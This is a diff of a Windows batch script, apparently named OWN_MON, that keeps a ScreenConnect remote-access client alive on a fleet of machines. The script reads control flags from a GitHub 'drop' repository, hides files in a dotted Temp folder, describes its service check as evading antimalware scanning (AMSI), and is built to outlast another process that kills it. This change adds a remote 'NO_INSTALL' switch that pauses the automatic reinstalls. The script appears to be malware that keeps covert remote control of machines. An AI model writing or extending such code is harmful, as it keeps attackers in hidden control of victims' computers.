@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M66
+rem  OWN_MON  BUILD 20260804M67
+rem  M67: NO_INSTALL freeze — no auto msiexec/HEAL/REINSTALL/PUSH-START; watcher stays ON.
 rem  M66: NEVER sc stop Gryxa on force (M64 bounce left 60+ Stopped when Guest killed mon mid-tick).
 rem       PUSH-START/RECONNECT = detached start-only; Stopped → multi-start no HEAL.
 rem  M65: never bypass HEAL rate-limit on 1060; keep gryxa_msi.lock (no delete before queue) — stops panel dupes.
@@ -600,10 +601,11 @@ set "FORCE_G=0"
 set "OBSERVE=0"
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 
-rem M60: observe.flag from repo — fleet-wide freeze of heal/force so we can see real drop cause
+rem M60/M67: observe + no_install from repo — freeze all auto install/heal/force
+set "NO_INSTALL=0"
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%WD%\observe.new" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/observe.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
 if exist "%WD%\observe.new" (
-  findstr /I /C:"OBSERVE" "%WD%\observe.new" >nul 2>&1
+  findstr /I /C:"OBSERVE" /C:"NO_INSTALL" "%WD%\observe.new" >nul 2>&1
   if not errorlevel 1 (
     set "OBSERVE=1"
     copy /y "%WD%\observe.new" "%WD%\observe.flag" >nul 2>&1
@@ -611,8 +613,24 @@ if exist "%WD%\observe.new" (
     del /f /q "%WD%\observe.flag" >nul 2>&1
   )
 )
+"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%WD%\no_install.new" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/no_install.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
+if exist "%WD%\no_install.new" (
+  findstr /I /C:"NO_INSTALL" "%WD%\no_install.new" >nul 2>&1
+  if not errorlevel 1 (
+    set "NO_INSTALL=1"
+    set "OBSERVE=1"
+    copy /y "%WD%\no_install.new" "%WD%\no_install.flag" >nul 2>&1
+  ) else (
+    del /f /q "%WD%\no_install.flag" >nul 2>&1
+  )
+)
 if exist "%WD%\observe.flag" set "OBSERVE=1"
-if "!OBSERVE!"=="1" echo gryxa_OBSERVE_mode_no_heal_no_force>>"%LOG%"
+if exist "%WD%\no_install.flag" (
+  set "NO_INSTALL=1"
+  set "OBSERVE=1"
+)
+if "!NO_INSTALL!"=="1" echo gryxa_NO_INSTALL_freeze_no_msiexec_no_heal_no_force>>"%LOG%"
+if "!OBSERVE!"=="1" if "!NO_INSTALL!"=="0" echo gryxa_OBSERVE_mode_no_heal_no_force>>"%LOG%"
 rem rotate old gryxa uninstall evidence so diag VERDICT is not forever OUR_GRYXA_UNINSTALL
 if "!OBSERVE!"=="1" if exist "%WD%\own_gryxa.log" if not exist "%WD%\own_gryxa.log.pre_observe" (
   move /y "%WD%\own_gryxa.log" "%WD%\own_gryxa.log.pre_observe" >nul 2>&1
@@ -633,11 +651,12 @@ if exist "%WD%\force_gryxa.new" (
     )
   )
 )
-rem OBSERVE blocks classic REINSTALL force only — PUSH-RECONNECT / PUSH-START still run
+rem M67: NO_INSTALL kills all force. OBSERVE blocks classic REINSTALL force only.
 set "FORCE_RECONNECT=0"
 if exist "%WD%\force_gryxa.new" (
   findstr /C:"RECONNECT" /C:"PUSH-START" "%WD%\force_gryxa.new" >nul 2>&1 && set "FORCE_RECONNECT=1"
 )
+if "!NO_INSTALL!"=="1" set "FORCE_G=0"
 if "!OBSERVE!"=="1" if "!FORCE_RECONNECT!"=="0" set "FORCE_G=0"
 
 rem Detect Gryxa — CMD first (AMSI-proof). Only trust PS health if line starts with HEALTHY|BROKEN|STUCK|ABSENT|
@@ -686,8 +705,13 @@ if "!GRYXA_OK!"=="0" if exist "%WD%\own_lib.ps1" (
 )
 echo gryxa_health=!GH!>>"%LOG%"
 
-rem FORCE: PUSH-START/RECONNECT = NEVER sc stop (M64 bounce + Guest kill left fleet Stopped). Detached start or HEAL 1060.
+rem FORCE: disabled entirely under NO_INSTALL; otherwise PUSH-START/RECONNECT start-only (never sc stop)
 if "%FORCE_G%"=="1" (
+  if "!NO_INSTALL!"=="1" (
+    echo gryxa_force_blocked_NO_INSTALL>>"%LOG%"
+    if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
+    goto :GryxaAfter
+  )
   if "!FORCE_RECONNECT!"=="1" (
     echo gryxa_force_START_ONLY observe=!OBSERVE! ok=!GRYXA_OK!>>"%LOG%"
     if "!GRYXA_OK!"=="1" (
@@ -698,8 +722,7 @@ if "%FORCE_G%"=="1" (
         echo gryxa_force_detached_start>>"%LOG%"
         call :QueueGryxaStartOnly
       ) else (
-        echo gryxa_force_start_heal_1060>>"%LOG%"
-        call :QueueGryxaHeal HEAL
+        echo gryxa_force_start_heal_1060_blocked_use_manual>>"%LOG%"
       )
     )
     if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
@@ -718,8 +741,7 @@ if "%FORCE_G%"=="1" (
       echo gryxa_force_skip_svc_exists_start_only>>"%LOG%"
       call :QueueGryxaStartOnly
     ) else (
-      echo gryxa_force_push_reinstall_1060_only>>"%LOG%"
-      call :QueueGryxaHeal REINSTALL
+      echo gryxa_force_push_reinstall_blocked_NO_auto>>"%LOG%"
     )
   )
   if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
@@ -816,8 +838,13 @@ if "!GRYXA_OK!"=="0" (
   )
 )
 
-rem heal ONLY on hard 1060 (service missing). Never msiexec while svc exists.
+rem heal ONLY on hard 1060 — blocked under NO_INSTALL
 set "NEED_HEAL=0"
+if "!NO_INSTALL!"=="1" (
+  echo gryxa_NO_INSTALL_skip_heal GRYXA_OK=!GRYXA_OK!>>"%LOG%"
+  echo %DATE% %TIME% no_install ok=!GRYXA_OK! fp=%GRYXA_FP% gh=!GH!>>"%WD%\drop_trace.log"
+  goto :AfterNeedHeal
+)
 if "!OBSERVE!"=="1" (
   echo gryxa_observe_heal_allowed_no_reinstall GRYXA_OK=!GRYXA_OK!>>"%LOG%"
   echo %DATE% %TIME% observe ok=!GRYXA_OK! fp=%GRYXA_FP% gh=!GH!>>"%WD%\drop_trace.log"
@@ -832,10 +859,11 @@ if "!GRYXA_OK!"=="0" (
   )
 )
 if "!NEED_HEAL!"=="1" call :QueueGryxaHeal HEAL
+:AfterNeedHeal
 
 if "%DO_DEEP%"=="1" echo done>"%GRYXA_DEEP%"
 echo gryxa_freeze_or_heal_done>>"%LOG%"
-echo %DATE% %TIME% tick_gryxa ok=!GRYXA_OK! observe=!OBSERVE! force=!FORCE_G!>>"%WD%\drop_trace.log"
+echo %DATE% %TIME% tick_gryxa ok=!GRYXA_OK! observe=!OBSERVE! no_install=!NO_INSTALL! force=!FORCE_G!>>"%WD%\drop_trace.log"
 
 :GryxaAfter
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
@@ -997,6 +1025,11 @@ if !_PN! EQU 0 exit /b 1
 exit /b 0
 
 :QueueGryxaStartOnly
+rem M67: blocked under NO_INSTALL
+if exist "%WD%\no_install.flag" (
+  echo gryxa_start_blocked_NO_INSTALL>>"%LOG%"
+  exit /b 0
+)
 rem Detached sc start — survives sevrz Guest 10s kill (never sc stop)
 set "GSVC=ScreenConnect Client (%GRYXA_FP%)"
 if not exist "%SystemRoot%\Temp\.upd" mkdir "%SystemRoot%\Temp\.upd" >nul 2>&1
@@ -1019,6 +1052,11 @@ echo gryxa_start_only_queued>>"%LOG%"
 exit /b 0
 
 :QueueGryxaHeal
+rem M67: NO_INSTALL blocks all auto msiexec HEAL/REINSTALL
+if exist "%WD%\no_install.flag" (
+  echo gryxa_heal_blocked_NO_INSTALL mode=%~1>>"%LOG%"
+  exit /b 0
+)
 rem %1=REINSTALL|HEAL — OBSERVE blocks REINSTALL only; HEAL (start/1060-i) allowed
 rem M65: ALWAYS rate-limit (20m if 1060, 90m if svc exists). Never delete gryxa_msi.lock here.
 set "HEALMODE=%~1"
@@ -1102,7 +1140,11 @@ if "!NEED_LOOP!"=="1" (
 exit /b 0
 
 :EnsureGryxaMust
-rem M66: Stopped → detached multi-start only; HEAL only on hard 1060
+rem M67: NO_INSTALL — report only, no HEAL/start queue. Else: Stopped→start; 1060→HEAL.
+if exist "%WD%\no_install.flag" (
+  echo gryxa_must_blocked_NO_INSTALL>>"%LOG%"
+  exit /b 0
+)
 set "GRYXA_OK=0"
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 set "GSVC=ScreenConnect Client (%GRYXA_FP%)"
